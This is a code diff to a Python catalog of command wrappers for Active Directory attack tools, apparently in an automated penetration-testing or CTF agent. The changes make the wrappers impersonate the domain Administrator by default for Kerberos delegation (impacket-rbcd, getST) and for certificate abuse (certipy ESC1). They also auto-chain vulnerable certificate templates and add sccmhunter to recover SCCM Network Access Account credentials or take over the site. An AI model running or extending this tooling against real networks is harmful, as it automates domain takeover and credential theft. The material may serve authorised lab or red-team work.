@@ -417,10 +417,10 @@ CATALOG: list[CommandSpec] = [
                     "Needs creds for a principal with write over the target computer.",
         binary="impacket-rbcd", category="ad-smb",
         parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
-            "delegate_from": {"type": "string", "description": "Account you control, e.g. ATTACK$."},
+            "delegate_from": {"type": "string", "description": "Account you control (default ATTACK$)."},
             "delegate_to": {"type": "string", "description": "Target computer, e.g. DC01$."}},
-            ["target", "domain", "username", "password", "delegate_from", "delegate_to"]),
-        build_args=lambda k: ["-delegate-from", _s(k["delegate_from"]),
+            ["target", "domain", "username", "password", "delegate_to"]),
+        build_args=lambda k: ["-delegate-from", _s(k.get("delegate_from") or "ATTACK$"),
                               "-delegate-to", _s(k["delegate_to"]), "-action", "write",
                               "-dc-ip", _s(k["target"]),
                               f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
@@ -435,9 +435,10 @@ CATALOG: list[CommandSpec] = [
         binary="impacket-getST", category="ad-smb",
         parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
             "spn": {"type": "string", "description": "Target SPN, e.g. cifs/DC01.ctf.local."},
-            "impersonate": {"type": "string", "description": "User to impersonate, e.g. Administrator."}},
-            ["target", "domain", "username", "password", "spn", "impersonate"]),
-        build_args=lambda k: ["-spn", _s(k["spn"]), "-impersonate", _s(k["impersonate"]),
+            "impersonate": {"type": "string", "description": "User to impersonate (default Administrator)."}},
+            ["target", "domain", "username", "password", "spn"]),
+        build_args=lambda k: ["-spn", _s(k["spn"]),
+                              "-impersonate", _s(k.get("impersonate") or "Administrator"),
                               "-dc-ip", _s(k["target"]),
                               f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
         install_hint="pipx install impacket.",
@@ -468,8 +469,11 @@ CATALOG: list[CommandSpec] = [
                               "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                               "-ns", _s(k["target"]), "-dns-tcp",
                               "-stdout", "-vulnerable"],
-        # harvest the CA name so certipy_req can auto-fill it (partial ADCS chaining)
-        harvest=[HarvestRule("ca", r"CA Name\s*:\s*(\S+)")],
+        # harvest the CA + a vulnerable template name so certipy_req auto-fills them
+        # (full ADCS chaining: find -> req -> auth). -vulnerable output only lists
+        # vulnerable templates, so the first Template Name is an abusable one.
+        harvest=[HarvestRule("ca", r"CA Name\s*:\s*(\S+)"),
+                 HarvestRule("template", r"Template Name\s*:\s*(\S+)")],
         aliases=["certipy"], timeout=600,
         install_hint="pipx install certipy-ad (point DNS at a DC — the DC is the name server).",
     ),
@@ -549,8 +553,9 @@ CATALOG: list[CommandSpec] = [
         build_args=lambda k: ["req", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                               "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                               "-ns", _s(k["target"]), "-dns-tcp",
-                              "-ca", _s(k["ca"]), "-template", _s(k["template"])]
-                             + (["-upn", _s(k["upn"])] if k.get("upn") else []),
+                              "-ca", _s(k["ca"]), "-template", _s(k["template"]),
+                              # impersonate the domain admin by default (ESC1)
+                              "-upn", _s(k.get("upn") or f"administrator@{_s(k['domain'])}")],
         harvest=[HarvestRule("pfx", r"Saved certificate and private key to '([^']+\.pfx)'")],
         aliases=["certipy"], timeout=600, install_hint="pipx install certipy-ad.",
     ),
@@ -736,6 +741,22 @@ CATALOG: list[CommandSpec] = [
     ),
 
     # ==== Batch D: unauth AD roasting / GPO / net-services / web injection =
+    CommandSpec(
+        name="sccmhunter",
+        description="Enumerate and attack SCCM/MECM (Microsoft Configuration Manager): "
+                    "'find' locates the site/management/distribution servers in AD; other "
+                    "modules (smb/http/admin/mssql/dpapi) recover Network Access Account "
+                    "(NAA) credentials or take over the site. Needs a domain credential.",
+        binary="sccmhunter", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
+            "action": {"type": "string", "description": "sccmhunter module: find (default), "
+                       "smb, http, admin, mssql, dpapi."}},
+            ["target", "domain", "username", "password"]),
+        build_args=lambda k: [_s(k.get("action", "find")), "-u", _s(k["username"]),
+                              "-p", _s(k["password"]), "-d", _s(k["domain"]),
+                              "-dc-ip", _s(k["target"])],
+        timeout=900, install_hint="pipx install sccmhunter (or git clone garrettfoster13/sccmhunter).",
+    ),
     CommandSpec(
         name="pre2k",
         description="Check for pre-created (pre-Windows-2000) computer accounts whose "
